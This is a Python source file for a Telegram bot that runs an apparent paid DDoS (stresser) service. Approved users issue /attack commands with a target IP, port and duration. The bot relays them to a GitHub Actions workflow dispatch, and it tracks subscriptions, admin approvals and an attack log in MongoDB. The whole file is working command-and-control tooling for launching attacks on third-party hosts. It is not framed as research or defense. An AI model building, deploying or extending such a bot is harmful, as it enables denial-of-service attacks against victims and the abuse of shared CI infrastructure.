import asyncio
import logging
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update
from telegram.ext import (
    Application,
    CommandHandler,
    filters,
    ContextTypes
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
from bson import ObjectId
import re
from functools import wraps
import html
import uuid
import os
from dotenv import load_dotenv

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
API_URL = os.getenv("API_URL")
API_KEY = os.getenv("API_KEY")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "1793697840").split(",")]

# Blocked ports
BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
MIN_PORT = 1
MAX_PORT = 65535

def make_aware(dt):
    if dt is None: return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

# MongoDB Connection
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        
        try:
            self.users.drop_indexes()
            self.attacks.drop_indexes()
            self.attacks.create_index([("timestamp", DESCENDING)])
            self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
            logger.info("Database Indexes Initialized")
        except Exception as e:
            logger.error(f"Index Error: {e}")
        
    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            for key in ["created_at", "approved_at", "expires_at"]:
                if user.get(key): user[key] = make_aware(user[key])
        return user
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing_user = self.get_user(user_id)
        if existing_user: return existing_user
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "approved_at": None,
            "expires_at": None,
            "total_attacks": 0,
            "created_at": get_current_time(),
            "is_banned": False
        }
        self.users.insert_one(user_data)
        return user_data
    
    def approve_user(self, user_id: int, days: int) -> bool:
        expires_at = get_current_time() + timedelta(days=days)
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": expires_at}}
        )
        return result.modified_count > 0

    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, response: str = None):
        attack_data = {
            "_id": str(uuid.uuid4()),
            "user_id": user_id,
            "ip": ip, "port": port, "duration": duration,
            "status": status, "response": response[:500] if response else None,
            "timestamp": get_current_time()
        }
        self.attacks.insert_one(attack_data)
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})

db = Database()

# Auth Decorator
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("❌ Admin only command.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# Launch Attack Function - FIXED FOR GITHUB ACTIONS
def launch_attack(ip: str, port: int, duration: int) -> Dict:
    try:
        # GitHub Payload Format
        payload = {
            "ref": "main",
            "inputs": {
                "host": str(ip),
                "port": str(port),
                "time": str(duration)
            }
        }
        # Correct GitHub Headers
        headers = {
            "Authorization": f"token {API_KEY}",
            "Accept": "application/vnd.github.v3+json",
            "Content-Type": "application/json"
        }
        # Direct POST to the dispatch URL
        response = requests.post(API_URL, json=payload, headers=headers, timeout=15)
        
        if response.status_code == 204:
            return {"success": True}
        else:
            return {"success": False, "error": response.text}
    except Exception as e:
        return {"success": False, "error": str(e)}

# Handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db.create_user(user.id, user.username)
    await update.message.reply_text(f"🚀 Welcome {user.first_name}!\nUse /attack <ip> <port> <time> if approved.")

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.get_user(user_id)

    if not user or not user.get("approved") or (user.get("expires_at") and make_aware(user["expires_at"]) < get_current_time()):
        await update.message.reply_text("❌ You are not approved or your plan expired.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack <ip> <port> <time>")
        return

    ip, port, duration = context.args[0], int(context.args[1]), int(context.args[2])

    if port in BLOCKED_PORTS:
        await update.message.reply_text(f"❌ Port {port} is blocked.")
        return

    msg = await update.message.reply_text("🚀 Launching Attack...")
    result = launch_attack(ip, port, duration)

    if result.get("success"):
        db.log_attack(user_id, ip, port, duration, "success")
        await msg.edit_text(f"✅ Attack Sent Successfully!\n🎯 Target: {ip}:{port}\n⏱️ Time: {duration}s")
    else:
        db.log_attack(user_id, ip, port, duration, "failed", result.get("error"))
        await msg.edit_text(f"❌ Attack Failed!\nError: {result.get('error')}")

@admin_required
async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 2: return
    uid, days = int(context.args[0]), int(context.args[1])
    if db.approve_user(uid, days):
        await update.message.reply_text(f"✅ Approved {uid} for {days} days.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("approve", approve))
    print("🤖 Bot is running...")
    app.run_polling()

if __name__ == '__main__':
    main()
